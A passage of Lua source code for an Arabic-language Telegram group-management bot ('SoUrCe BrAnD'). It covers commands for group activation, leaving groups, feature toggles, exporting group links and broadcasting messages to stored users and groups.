local VipList = DevBrAnD:scard(BrAnD.."BrAnD:VipMem:"..ChatId) or 0
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..ChatId))
if LinkGp.ok == true then LinkGroup = LinkGp.result else LinkGroup = 't.me/CXRCX' end
tdcli_function({ID ="GetChat",chat_id_=ChatId},function(arg,dp)
tdcli_function ({ID = "GetChANnElMembers",ChANnEl_id_ = ChatId:gsub("-100",""),filter_ = {ID = "ChANnElMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
if dp.id_ then
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
Manager_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = Manager_id},function(arg,BrAnD) 
if BrAnD.first_name_ ~= false then
ConstructorBrAnD = "["..BrAnD.first_name_.."](T.me/"..(BrAnD.username_ or "CXRCX")..")"
else 
ConstructorBrAnD = "حساب محذوف"
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ المجموعه ↫ ["..dp.title_.."]("..LinkGroup..")\n♰ ⌯ الايدي ↫ ( `"..ChatId.."` )\n♰ ⌯ المنشئ ↫ "..ConstructorBrAnD.."\n♰ ⌯ عدد المدراء ↫ ( *"..ManagerList.."* )\n♰ ⌯ عدد المنشئين ↫ ( *"..ConstructorList.."* )\n♰ ⌯ عدد الادمنيه ↫ ( *"..AdminsList.."* )\n♰ ⌯ عدد المميزين ↫ ( *"..VipList.."* )\n♰ ⌯ عدد المحظورين ↫ ( *"..BanedList.."* )\n♰ ⌯ عدد المقيدين ↫ ( *"..TkeedList.."* )\n♰ ⌯ عدد المكتومين ↫ ( *"..MutedList.."* )", 1,"md")
end,nil)
end
end
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لم تتم اضافتي بها لاقوم بكشفها", 1, "md")
end
end,nil)
end,nil)
end 
end
--     SoUrCe BrAnD     --
if text and text:match("^غادر (-%d+)$")  then
local Text = { string.match(text, "^(غادر) (-%d+)$")}
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط', 1, 'md')
else 
tdcli_function({ID ="GetChat",chat_id_=Text[2]},function(arg,dp) 
if dp.id_ then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ المجموعه ↫ ["..dp.title_.."]\n♰ ⌯ تمت المغادره منها بنجاح", 1, "md")
Dev_BrAnD(Text[2], 0, 1, "♰ ⌯ بامر المطور تم مغادرة هذه المجموعه ", 1, "md")  
ChatLeave(dp.id_, BrAnD)
DevBrAnD:srem(BrAnD.."BrAnD:Groups", dp.id_)
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ لم تتم اضافتي بها لاقوم بمغادرتها", 1, "md")
end 
end,nil)
end 
end
--     SoUrCe BrAnD     --
if text and text:match("^تعين عدد الاعضاء (%d+)$") and Sudo(msg) or text and text:match("^تعيين عدد الاعضاء (%d+)$") and Sudo(msg) then
local Num = text:match("تعين عدد الاعضاء (%d+)$") or text:match("تعيين عدد الاعضاء (%d+)$")
DevBrAnD:set(BrAnD..'BrAnD:Num:Add:Bot',Num) 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ تم وضع عدد الاعضاء ↫ *'..Num..'* عضو', 1, 'md')
end
--     SoUrCe BrAnD     --
if text == 'تفعيل البوت الخدمي' then 
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط', 1, 'md')
else 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل البوت الخدمي'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Lock:FreeBot'..BrAnD) 
end 
end
if text == 'تعطيل البوت الخدمي' then 
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط', 1, 'md')
else 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل البوت الخدمي'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Lock:FreeBot'..BrAnD,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل الالعاب بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل الالعاب بنجاح'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD..'BrAnD:Lock:Games'..msg.chat_id_,true)  
end
if text == "تفعيل الرابط" or text == "تفعيل جلب الرابط" then 
if Admin(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تفعيل جلب رابط المجموعه'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:del(BrAnD.."BrAnD:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "تعطيل الرابط" or text == "تعطيل جلب الرابط" then 
if Admin(msg) then
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ تم تعطيل جلب رابط المجموعه'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
DevBrAnD:set(BrAnD.."BrAnD:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
--     SoUrCe BrAnD     --
if text and text:match('^تفعيل$') and SudoBot(msg) and SoUrCeCh(msg) then
if ChatType ~= 'sp' then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChANnElFull", ChANnEl_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(DevBrAnD:get(BrAnD..'BrAnD:Num:Add:Bot') or 0) and not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عدد اعضاء المجموعه اقل من ↫ *'..(DevBrAnD:get(BrAnD..'BrAnD:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
DevBrAnD:del(BrAnD..'BrAnD:BrAnDConstructor:'..msg.chat_id_)
tdcli_function ({ID = "GetChANnElMembers",ChANnEl_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChANnElMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,abbas) 
local admins = abbas.members_
for i=0 , #admins do
if abbas.members_[i].bot_info_ == false and abbas.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevBrAnD:srem(BrAnD..'BrAnD:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevBrAnD:sadd(BrAnD..'BrAnD:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if abbas.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevBrAnD:sadd(BrAnD.."BrAnD:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevBrAnD:sadd(BrAnD.."BrAnD:BrAnDConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevBrAnD:srem(BrAnD.."BrAnD:BasicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevBrAnD:srem(BrAnD.."BrAnD:BrAnDConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevBrAnD:sismember(BrAnD..'BrAnD:Groups',msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المجموعه بالتاكيد مفعله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","♰ ⌯ تم تفعيل المجموعه "..dp.title_)  
DevBrAnD:sadd(BrAnD.."BrAnD:Groups",msg.chat_id_)
if not DevBrAnD:get(BrAnD..'BrAnD:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not Sudo(msg) then 
DevBrAnD:incrby(BrAnD..'BrAnD:Sudos'..msg.sender_user_id_,1)
DevBrAnD:set(BrAnD..'BrAnD:SudosGp'..msg.sender_user_id_..msg.chat_id_,"BrAnD")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevBrAnD:set(BrAnD.."BrAnD:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"♰ ⌯ تم تفعيل مجموعه جديده ↫ ⤈ \n⍆═════BR═════⍅\n♰ ⌯ بواسطة ↫ "..Name.."\n♰ ⌯ اسم المجموعه ↫ ["..NameChat.."]\n♰ ⌯ عدد اعضاء المجموعه ↫ ❨ *"..NumMem.."* ❩\n♰ ⌯ ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n♰ ⌯ رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n⍆═════BR═════⍅\n♰ ⌯ الوقت ↫ "..os.date("%I:%M%p").."\n♰ ⌯ التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end,nil)
end
if text == 'تعطيل' and SudoBot(msg) and SoUrCeCh(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevBrAnD:sismember(BrAnD..'BrAnD:Groups',msg.chat_id_) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ المجموعه بالتاكيد معطله', 1, 'md')
else
ReplyStatus(msg,result.id_,"ReplyBy","♰ ⌯ تم تعطيل المجموعه "..dp.title_)  
DevBrAnD:srem(BrAnD.."BrAnD:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevBrAnD:set(BrAnD.."BrAnD:Groups:Links"..msg.chat_id_,LinkGroup) 
SendText(DevId,"♰ ⌯ تم تعطيل مجموعه جديده ↫ ⤈ \n⍆═════BR═════⍅\n♰ ⌯ بواسطة ↫ "..Name.."\n♰ ⌯ اسم المجموعه ↫ ["..NameChat.."]\n♰ ⌯ ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n♰ ⌯ رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n⍆═════BR═════⍅\n♰ ⌯ الوقت ↫ "..os.date("%I:%M%p").."\n♰ ⌯ التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end
end,nil)
end,nil)
end
end
--     SoUrCe BrAnD     --
if text and text:match("^المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
SendText(DevId,"♰ ⌯ هناك من بحاجه الى مساعده ↫ ⤈ \n⍆═════BR═════⍅\n♰ ⌯ الشخص ↫ "..Name.."\n♰ ⌯ اسم المجموعه ↫ ["..NameChat.."]\n♰ ⌯ ايدي المجموعه ↫ ⤈ \n❨ `"..msg.chat_id_.."` ❩\n♰ ⌯ رابط المجموعه ↫ ⤈\n❨ ["..LinkGroup.."] ❩\n⍆═════BR═════⍅\n♰ ⌯ الوقت ↫ "..os.date("%I:%M%p").."\n♰ ⌯ التاريخ ↫ "..os.date("%Y/%m/%d").."",0,'md')
end,nil)
end,nil)
end
--     SoUrCe BrAnD     --
if text == 'جلب نسخه السورس' then
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
sendDocument(DevId, 0, 0, 1, nil, './BrAnD.lua', dl_cb, nil)
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ عزيزي المطور تم ارسال نسخة ملف السورس الى الخاص', 1, 'md')
end end
--     SoUrCe BrAnD     --
if text == 'روابط الكروبات' or text == 'روابط المجموعات' then
if not Sudo(msg) then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ للمطور الاساسي فقط ', 1, 'md')
else
local list = DevBrAnD:smembers(BrAnD.."BrAnD:Groups")
if #list == 0 then
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ لا يوجد مجموعات مفعله', 1, 'md')
else
Dev_BrAnD(msg.chat_id_, msg.id_, 1, '♰ ⌯ جاري ارسال نسخه تحتوي على '..#list..' مجموعه', 1, 'md')
local text = "♰ ⌯ SoUrCe BrAnD\n♰ ⌯ File Bot Groups\n⍆═════BR═════⍅\n"
for k,v in pairs(list) do
local GroupsManagers = DevBrAnD:scard(BrAnD.."BrAnD:Managers:"..v) or 0
local GroupsAdmins = DevBrAnD:scard(BrAnD.."BrAnD:Admins:"..v) or 0
local Groupslink = DevBrAnD:get(BrAnD.."BrAnD:Groups:Links" ..v)
text = text..k.." ↬ ⤈ \n♰ ⌯ Group ID ↬ "..v.."\n♰ ⌯ Group Link ↬ "..(Groupslink or "Not Found").."\n♰ ⌯ Group Managers ↬ "..GroupsManagers.."\n♰ ⌯ Group Admins ↬ "..GroupsAdmins.."\n⍆═════BR═════⍅\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(text)
File:close()
local abbas = 'https://api.telegram.org/bot' .. TokenBot .. '/sendDocument'
local curl = 'curl "' .. abbas .. '" -F "chat_id=' .. msg.chat_id_ .. '" -F "document=@' .. 'GroupsBot.txt' .. '"'
io.popen(curl)
end
end
end
--     SoUrCe BrAnD     --
if text == "اذاعه بالخاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص♰" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevBrAnD:get(BrAnD.."BrAnD:Send:Bot"..BrAnD) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"♰ ⌯ الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevBrAnD:setex(BrAnD.."BrAnD:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n♰ ⌯ للخروج ارسل ↫ ( الغاء ) \n ✓'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevBrAnD:get(BrAnD.."BrAnD:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = DevBrAnD:smembers(BrAnD..'BrAnD:Users') 
if msg.content_.text_ then
for k,v in pairs(list) do 
BrAnDText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
BrAnDText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
BrAnDText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(list) do 
BrAnDText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(list) do 
BrAnDText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(list) do 
BrAnDText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(list) do 
BrAnDText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
BrAnDText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم اذاعة "..BrAnDText.." بنجاح \n♰ ⌯ ‏الى ↫ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:Pv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     SoUrCe BrAnD     --
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام♰" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevBrAnD:get(BrAnD.."BrAnD:Send:Bot"..BrAnD) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"♰ ⌯ الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevBrAnD:setex(BrAnD.."BrAnD:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n♰ ⌯ للخروج ارسل ↫ ( الغاء ) \n ✓'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevBrAnD:get(BrAnD.."BrAnD:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false
end 
list = DevBrAnD:smembers(BrAnD..'BrAnD:Groups') 
if msg.content_.text_ then
for k,v in pairs(list) do 
BrAnDText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(list) do 
BrAnDText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(list) do 
BrAnDText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(list) do 
BrAnDText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(list) do 
BrAnDText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(list) do 
BrAnDText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(list) do 
BrAnDText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(list) do 
BrAnDText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم اذاعة "..BrAnDText.." بنجاح \n♰ ⌯ ‏في ↫ ❨ "..#list.." ❩ مجموعه \n ✓", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:Gp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     SoUrCe BrAnD     --
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه عام بالتوجيه♰" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevBrAnD:get(BrAnD.."BrAnD:Send:Bot"..BrAnD) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"♰ ⌯ الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevBrAnD:setex(BrAnD.."BrAnD:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ ارسل الرساله الان لتوجيها \n♰ ⌯ للخروج ارسل ↫ ( الغاء ) \n ✓'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevBrAnD:get(BrAnD.."BrAnD:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Groups')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم اذاعة رسالتك بالتوجيه \n♰ ⌯ ‏في ↫ ❨ "..#list.." ❩ مجموعه \n ✓", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:FwdGp" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     SoUrCe BrAnD     --
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه خاص بالتوجيه♰" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevBrAnD:get(BrAnD.."BrAnD:Send:Bot"..BrAnD) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"♰ ⌯ الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevBrAnD:setex(BrAnD.."BrAnD:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ ارسل الرساله الان لتوجيها \n♰ ⌯ للخروج ارسل ↫ ( الغاء ) \n ✓'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
if DevBrAnD:get(BrAnD.."BrAnD:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
return false  
end 
local list = DevBrAnD:smembers(BrAnD..'BrAnD:Users')   
for k,v in pairs(list) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_BrAnD(msg.chat_id_, msg.id_, 1, "♰ ⌯ تم اذاعة رسالتك بالتوجيه \n♰ ⌯ ‏الى ↫ ❨ "..#list.." ❩ مشترك \n ✓", 1, 'md')
DevBrAnD:del(BrAnD.."BrAnD:Send:FwdPv" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) 
end
--     SoUrCe BrAnD     --
if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) or text == "↫ اذاعه بالتثبيت♰" and msg.reply_to_message_id_ == 0 and SudoBot(msg) then 
if DevBrAnD:get(BrAnD.."BrAnD:Send:Bot"..BrAnD) and not Sudo(msg) then 
send(msg.chat_id_, msg.id_,"♰ ⌯ الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevBrAnD:setex(BrAnD.."BrAnD:Send:Gp:Pin" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
local BrAnDTeAM= '♰ ⌯ اهلا عزيزي ↫ '..BrAnDRank(msg)..' \n♰ ⌯ ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n♰ ⌯ للخروج ارسل ↫ ( الغاء ) \n ✓'
BrAnDmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, BrAnDTEAM, 14, string.len(msg.sender_user_id_))
return false
end 
